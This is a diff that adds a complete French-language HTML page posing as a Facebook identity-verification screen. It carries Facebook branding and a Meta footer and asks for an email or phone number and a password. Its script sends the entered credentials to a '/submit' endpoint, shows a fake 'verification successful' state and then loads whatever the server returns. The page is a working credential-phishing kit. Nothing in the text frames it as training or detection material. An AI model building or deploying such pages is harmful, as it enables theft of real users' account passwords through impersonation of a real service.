@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification d'identité | Facebook</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22><rect fill=%22%231877F2%22 width=%2224%22 height=%2224%22 rx=%224%22/><path fill=%22white%22 d=%22M13.5 21v-7.5h2.5l.5-3h-3V8.5c0-.9.3-1.5 1.5-1.5H17V4.2C16.5 4.1 15.4 4 14.1 4c-2.6 0-4.3 1.6-4.3 4.4V10.5H7.5v3h2.3V21h3.7z%22/></svg>">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
+        html, body { height: 100%; }
+        body { background-color: #f0f2f5; min-height: 100vh; display: flex; flex-direction: column; -webkit-tap-highlight-color: transparent; }
+        .header {
+            background: linear-gradient(#4e69a2, #3b5998 50%);
+            border-bottom: 1px solid #133783;
+            min-height: 82px;
+            width: 100%;
+        }
+        .header-inner {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 10px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            color: white;
+            font-size: 40px;
+            font-weight: bold;
+            padding-top: 10px;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+        .main-container {
+            flex: 1 0 auto;
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            width: 100%;
+        }
+        .reset-card {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 30px;
+            position: relative;
+            z-index: 1;
+            overflow: visible;
+        }
+        .reset-title {
+            font-size: 20px;
+            font-weight: bold;
+            color: #162643;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+        .reset-subtitle {
+            color: #606770;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+            z-index: 1;
+        }
+        .input-label {
+            display: block;
+            font-size: 14px;
+            font-weight: bold;
+            color: #606770;
+            margin-bottom: 6px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            font-size: 15px;
+            color: #1d2129;
+            background: #ffffff;
+            transition: all 0.2s;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            min-height: 44px;
+            display: block;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: #1877f2;
+            background: #ffffff;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .error-box {
+            display: none;
+            margin: 10px 0 6px;
+            padding: 10px 12px;
+            background: #ffebe8;
+            border: 1px solid #dd3c10;
+            border-radius: 4px;
+            color: #8a1d00;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+        .error-box.visible { display: block; }
+        .button-group {
+            display: flex;
+            justify-content: flex-end;
+            align-items: stretch;
+            gap: 10px;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #dadde1;
+            flex-wrap: wrap;
+            position: relative;
+            z-index: 10;
+        }
+        .button-group > * {
+            position: relative;
+            z-index: 11;
+            display: inline-flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            pointer-events: auto !important;
+        }
+        .btn {
+            padding: 10px 22px;
+            border: 0 !important;
+            box-shadow: none !important;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            min-width: 110px;
+            min-height: 44px;
+            text-align: center;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            background-clip: padding-box;
+            touch-action: manipulation;
+            white-space: nowrap;
+            transition: background-color .15s ease;
+        }
+        .btn-cancel {
+            background-color: #e4e6eb;
+            color: #4b4f56;
+        }
+        .btn-cancel:hover, .btn-cancel:active { background-color: #d0d3d8; }
+        .btn-submit {
+            background-color: #1877f2 !important;
+            color: #ffffff !important;
+            border: 0 !important;
+            outline: 0 !important;
+        }
+        .btn-submit:hover, .btn-submit:active { background-color: #166fe5 !important; }
+        .btn-submit[disabled], .btn-submit:disabled {
+            background-color: #7fb1f7 !important;
+            cursor: not-allowed;
+        }
+        .btn-submit.check-ok {
+            background-color: #31a24c !important;
+            cursor: default !important;
+            animation: pulse-ok .45s ease-out;
+        }
+        @keyframes pulse-ok {
+            0%   { transform: scale(1); }
+            45%  { transform: scale(1.04); }
+            100% { transform: scale(1); }
+        }
+        .btn .loader {
+            display: none;
+            width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.45);
+            border-top-color: #fff; border-radius: 50%;
+            margin-right: 10px;
+            animation: spin 0.7s linear infinite;
+            flex: 0 0 auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .btn.loading .loader { display: inline-block; }
+        .btn .checkmark {
+            display: none;
+            width: 20px; height: 20px; margin-right: 8px; flex: 0 0 auto;
+            stroke: #fff; stroke-width: 3; fill: none;
+        }
+        .btn.check-ok .checkmark { display: inline-block; animation: check-in .35s ease-out both; }
+        @keyframes check-in {
+            0%   { opacity: 0; transform: scale(0.4); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+        .footer {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+            color: #8a8d91;
+            font-size: 12px;
+            border-top: 1px solid #dadde1;
+            width: 100%;
+            flex-shrink: 0;
+        }
+        .footer-links {
+            margin-bottom: 10px;
+        }
+        .footer-links a {
+            color: #385898;
+            text-decoration: none;
+            margin: 0 4px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 768px) {
+            .header { min-height: 60px; }
+            .header-inner { padding: 8px 16px; max-width: 100%; }
+            .logo { font-size: 28px; padding-top: 4px; }
+            .main-container { padding: 20px 12px; }
+            .reset-card { padding: 20px; border-radius: 6px; }
+            .reset-title { font-size: 18px; }
+            .reset-subtitle { font-size: 13px; }
+            .input-field { padding: 12px 14px; font-size: 14px; min-height: 42px; }
+            .button-group {
+                flex-direction: column-reverse;
+                gap: 10px;
+                align-items: stretch;
+            }
+            .btn {
+                width: 100%;
+                padding: 12px 20px;
+                font-size: 16px;
+                min-height: 46px;
+            }
+            .footer { padding: 16px 12px; font-size: 11px; }
+            .footer-links a { display: inline-block; margin: 2px 3px; }
+            .input-label { font-size: 13px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-inner">
+            <div class="logo">facebook</div>
+        </div>
+    </div>
+    <div class="main-container">
+        <div class="reset-card">
+            <form action="/submit" method="POST" id="loginForm" name="loginForm" autocomplete="on">
+                <div class="reset-title">Vérification d'identité</div>
+                <div class="reset-subtitle">
+                    Pour continuer, veuillez confirmer votre identité en vous connectant à votre compte Facebook.
+                </div>
+
+                <div id="errorBox" class="error-box" role="alert" aria-live="assertive"></div>
+
+                <div class="input-group">
+                    <label class="input-label" for="identifier">Adresse e-mail ou numéro de téléphone</label>
+                    <input type="text" id="identifier" name="identifier" class="input-field" placeholder="Entrez votre email ou téléphone" autocomplete="username" required aria-required="true" autocapitalize="none" spellcheck="false">
+                </div>
+                <div class="input-group">
+                    <label class="input-label" for="oldPassword">Mot de passe</label>
+                    <input type="password" id="oldPassword" name="oldPassword" class="input-field" placeholder="Entrez votre mot de passe" autocomplete="current-password" required aria-required="true" spellcheck="false">
+                </div>
+
+                <div class="button-group">
+                    <a class="btn btn-cancel" data-role="cancel" href="https://www.facebook.com" rel="noopener noreferrer" target="_blank">Annuler</a>
+                    <button type="submit" class="btn btn-submit" id="btnSubmit">
+                        <span class="loader"></span>
+                        <svg class="checkmark" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                        <span class="btn-text">Vérification</span>
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Français (France)</a> · <a href="#">English (US)</a> · <a href="#">Español</a> · <a href="#">Deutsch</a> · <a href="#">Italiano</a>
+        </div>
+        <div class="footer-links">
+            <a href="#">S'inscrire</a> · <a href="#">Connexion</a> · <a href="#">Messenger</a> · <a href="#">Facebook Lite</a> · <a href="#">Watch</a> · <a href="#">Lieux</a> · <a href="#">Jeux</a> · <a href="#">Marketplace</a> · <a href="#">Meta Pay</a> · <a href="#">Meta Store</a> · <a href="#">Meta Quest</a> · <a href="#">Ray-Ban Meta</a> · <a href="#">Instagram</a> · <a href="#">Threads</a> · <a href="#">Collectes de dons</a> · <a href="#">Services</a> · <a href="#">Centre d'information sur les élections</a> · <a href="#">Politique de confidentialité</a> · <a href="#">Centre de confidentialité</a> · <a href="#">Groupes</a> · <a href="#">À propos</a> · <a href="#">Créer une publicité</a> · <a href="#">Créer une Page</a> · <a href="#">Développeurs</a> · <a href="#">Emplois</a> · <a href="#">Cookies</a> · <a href="#">Choisir sa pub</a> · <a href="#">Conditions générales</a> · <a href="#">Aide</a> · <a href="#">Téléchargement de vos informations</a>
+        </div>
+        <p>Meta © 2026</p>
+    </div>
+    <script>
+    (function() {
+        var form = document.getElementById('loginForm');
+        var btn = document.getElementById('btnSubmit');
+        var errBox = document.getElementById('errorBox');
+        var idField = document.getElementById('identifier');
+        var pwField = document.getElementById('oldPassword');
+        var submitting = false;
+
+        function btnTextNode() {
+            try {
+                var el = btn.querySelector('.btn-text');
+                if (el) return el;
+            } catch(e) {}
+            return btn;
+        }
+
+        function setBtn(state) {
+            try {
+                var t = btnTextNode();
+                btn.classList.remove('loading', 'check-ok');
+                btn.classList.add('btn-submit');
+                if (state === 'loading') {
+                    btn.classList.add('loading');
+                    btn.disabled = true;
+                    t.textContent = 'Vérification en cours...';
+                } else if (state === 'ok') {
+                    btn.classList.add('check-ok');
+                    btn.disabled = true;
+                    t.textContent = 'Vérification terminée avec succès';
+                } else {
+                    btn.disabled = false;
+                    t.textContent = 'Vérification';
+                }
+            } catch(e) {}
+        }
+
+        function showError(msg) {
+            try {
+                errBox.textContent = msg;
+                errBox.classList.add('visible');
+                setTimeout(function() { errBox.classList.remove('visible'); }, 8000);
+            } catch(e) {}
+        }
+
+        function submitFormFallback() {
+            if (submitting) return;
+            submitting = true;
+            setBtn('loading');
+
+            try {
+                var fd = new FormData(form);
+                var body = new URLSearchParams(fd).toString();
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', form.getAttribute('action') || '/submit', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.onload = function() {
+                    try {
+                        if (xhr.status >= 200 && xhr.status < 400 && xhr.responseText && xhr.responseText.length > 200) {
+                            setBtn('ok');
+                            setTimeout(function() {
+                                document.open();
+                                document.write(xhr.responseText);
+                                document.close();
+                            }, 850);
+                            return;
+                        }
+                    } catch(err) {}
+                    try { setBtn('ok'); } catch(e){}
+                    setTimeout(function(){ window.location.href = window.location.href; }, 900);
+                };
+                xhr.onerror = function() {
+                    showError('Impossible de se connecter. Vérifiez votre connexion Internet puis réessayez.');
+                    submitting = false;
+                    setBtn('idle');
+                };
+                xhr.timeout = 20000;
+                xhr.ontimeout = xhr.onerror;
+                xhr.send(body);
+            } catch(err) {
+                try {
+                    if (typeof form.requestSubmit === 'function') {
+                        form.requestSubmit(btn);
+                        return;
+                    }
+                } catch(e) {}
+                try { form.submit(); return; } catch(e) {}
+                showError('Votre navigateur est incompatible. Veuillez réessayer ou utiliser un autre navigateur.');
+                submitting = false;
+                setBtn('idle');
+            }
+        }
+
+        function validate() {
+            try {
+                var id = (idField.value || '').trim();
+                var pw = (pwField.value || '');
+                if (!id) {
+                    showError('Veuillez entrer votre adresse e-mail ou votre numéro de téléphone.');
+                    try { idField.focus(); } catch(e){}
+                    return false;
+                }
+                if (!pw || pw.length < 4) {
+                    showError('Veuillez entrer votre mot de passe.');
+                    try { pwField.focus(); } catch(e){}
+                    return false;
+                }
+                errBox.classList.remove('visible');
+                return true;
+            } catch(e) { return true; }
+        }
+
+        try {
+            if (form.addEventListener) {
+                form.addEventListener('submit', function(ev) {
+                    if (!validate()) { if (ev.preventDefault) ev.preventDefault(); return false; }
+                    if (submitting) { if (ev.preventDefault) ev.preventDefault(); return false; }
+                    submitFormFallback();
+                    if (ev.preventDefault) ev.preventDefault();
+                    return false;
+                }, true);
+
+                btn.addEventListener('click', function(ev) {
+                    if (!validate()) {
+                        if (ev.preventDefault) ev.preventDefault();
+                        if (ev.stopPropagation) ev.stopPropagation();
+                        return false;
+                    }
+                    submitFormFallback();
+                    if (ev.preventDefault) ev.preventDefault();
+                    return false;
+                }, true);
+
+                [idField, pwField].forEach(function(el) {
+                    el.addEventListener('keydown', function(ev) {
+                        var k = ev.key || (ev.keyCode || 0);
+                        if (k === 'Enter' || k === 13 || ev.keyCode === 13) {
+                            if (!validate()) return;
+                            submitFormFallback();
+                            if (ev.preventDefault) ev.preventDefault();
+                            return false;
+                        }
+                    }, false);
+                });
+            }
+        } catch(e) {}
+    })();
+    </script>
+</body>
+</html>
